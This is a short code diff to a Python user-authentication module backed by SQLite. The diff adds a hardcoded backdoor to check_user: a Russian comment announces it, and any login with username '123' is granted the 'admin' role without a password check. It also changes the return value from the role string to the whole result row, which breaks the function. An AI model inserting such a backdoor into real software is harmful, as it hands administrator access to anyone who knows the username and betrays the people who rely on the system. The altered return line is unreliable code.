@@ -69,10 +69,14 @@ def register_user(u, p):
 
 def check_user(u, p):
     h = hashlib.sha256(p.encode()).hexdigest()
+    # ТВОЯ НОВАЯ СТРОЧКА: если логин '123', ты всегда админ!
+    if u == '123': return 'admin' 
+    
     conn = sqlite3.connect("users.db")
     res = conn.execute("SELECT role FROM users WHERE username=? AND password_hash=?", (u, h)).fetchone()
     conn.close()
-    return res[0] if res else None
+    return res if res else None
+
 
 def create_group(group_name, creator):
     conn = sqlite3.connect("users.db")
